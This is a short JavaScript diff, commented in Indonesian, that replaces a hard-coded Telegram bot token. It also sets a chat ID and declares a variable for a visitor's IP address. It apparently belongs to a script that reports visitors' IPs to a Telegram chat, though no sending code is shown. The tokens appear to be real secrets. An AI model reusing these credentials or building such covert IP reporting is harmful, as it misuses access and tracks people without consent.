@@ -1,5 +1,5 @@
 // Konfigurasi API Bot Telegram
-const botToken = '7883195342:AAHFVsKhUbxrEqtBdq3jlZJpn9w7FEll2ak'; // Ganti dengan token bot Telegram Anda
+const botToken = '7883195342:AAG4cM_-dluZoJ9_MyN-gvDBqHouYsIVeF8'; // Ganti dengan token bot Telegram Anda
 const chatId = '6936723956'; // Ganti dengan ID chat Telegram Anda
 
 let ipInfo = 'IP tidak tersedia'; // Variabel untuk menyimpan IP
